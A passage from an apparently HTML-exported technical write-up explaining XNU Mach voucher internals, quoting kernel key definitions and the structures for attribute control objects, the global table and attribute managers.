&lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_ENTRIES_INLINE MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;The voucher codebase is written in a very generic, extensible way, even though its actual use and supported feature set is quite minimal.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.ws3slh7jndn7\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;Keys&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Keys in vouchers are not arbitrary. Keys are &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;indexes&lt;/span&gt;&lt;span&gt;&amp;nbsp;into a voucher&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;; a value&amp;#39;s position in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;table determines what &amp;quot;key&amp;quot; it was stored under. Whilst the vouchers codebase supports the runtime addition of new key types this feature isn&amp;#39;t used and there are just a small number of fixed, well-known keys:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.bb8dc8863bbdd47aa96ca2a52c637e312485af31\"&gt;&lt;/a&gt;&lt;a id=\"t.1\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ALL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)~&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NONE &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* other well-known-keys will be added here */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_ATM &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_IMPORTANCE &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;2&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_BANK &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;3&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_PTHPRIORITY &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;4&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;7&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_TEST &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;((&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;mach_voucher_attr_key_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;8&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;#define&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN MACH_VOUCHER_ATTR_KEY_TEST&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_inline_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;has 8 entries. But of those, only four are actually supported and have any associated functionality. The ATM voucher attributes are deprecated and the code supporting them is gone so only IMPORTANCE (2), BANK (3), PTHPRIORITY (4) and USER_DATA (7) are valid keys. There&amp;#39;s some confusion (perhaps on my part) about when exactly you should use the term key and when attribute; I&amp;#39;ll use them interchangeably to refer to these key values and the corresponding &amp;quot;types&amp;quot; of values which they manage. More on that later.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.z3ifj5rlshxh\"&gt;&lt;span class=\"BGLtzooHlW-c20\"&gt;Values&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Each entry in a voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_index_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.adadf70a01ef64fd38d16dcc040ece0a87975524\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;typedef&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;natural_t iv_index_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Each value is again an index; this time into a &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c14\"&gt;per-key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;cache of values, abstracted as a &amp;quot;Voucher Attribute Cache Control Object&amp;quot; represented by this structure:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.34f3e7551949b227b144fa7c23780e56054cf088\"&gt;&lt;/a&gt;&lt;a id=\"t.3\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_attr_control &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;os_refcnt_t &amp;nbsp; ivac_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;boolean_t &amp;nbsp; &amp;nbsp; ivac_is_growing&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* is the table being grown */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* table of voucher attr value entries */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_init_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* size of the attr value table */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_freelist&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* index of the first free element */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_port_t &amp;nbsp; &amp;nbsp;ivac_port&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* port for accessing the cache control &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;lck_spin_t &amp;nbsp; &amp;nbsp;ivac_lock_data&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_index_t &amp;nbsp; &amp;nbsp;ivac_key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* key index for this value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;These are accessed indirectly via another global table:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.458710f747bcd533915a3238dbd017b636296741\"&gt;&lt;/a&gt;&lt;a id=\"t.4\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_global_table_element iv_global_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;(Again, the comments in the code indicate that in the future that this table may grow in size and allow attributes to be managed in userspace, but for now it&amp;#39;s just a fixed size array.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Each element in that table has this structure:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.f065f1b068e3aad8a11a5356fab0dbe3d10ab90a\"&gt;&lt;/a&gt;&lt;a id=\"t.5\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;typedef&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_global_table_element &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_manager&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_control_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivgte_control&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivgte_key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_global_table_element&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Both the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_global_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;and each voucher&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;are indexed by &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;(key-1)&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;key&lt;/span&gt;&lt;span&gt;, so the userdata entry is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;[6]&lt;/span&gt;&lt;span&gt;, not &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;[7]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;, even though the array still has 8 entries.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_attr_control_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides an abstract interface for managing &amp;quot;values&amp;quot; and the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span&gt;&amp;nbsp;provides the &amp;quot;type-specific&amp;quot; logic to implement the semantics of each type (here by type I mean &amp;quot;key&amp;quot; or &amp;quot;attr&amp;quot; type.) Let&amp;#39;s look more concretely at what that means. Here&amp;#39;s the definition of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_voucher_attr_manager_t&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.467ea53fdb41a42817b67f1b1b14674c0e55d04b\"&gt;&lt;/a&gt;&lt;a id=\"t.6\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ipc_voucher_attr_manager &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_release_value_t &amp;nbsp; &amp;nbsp;ivam_release_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_get_value_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_extract_content_t &amp;nbsp;ivam_extract_content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_release_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; ipc_voucher_attr_manager_flags &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivam_flags&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_flags&lt;/span&gt;&lt;span&gt;&amp;nbsp;is an &lt;/span&gt;&lt;span 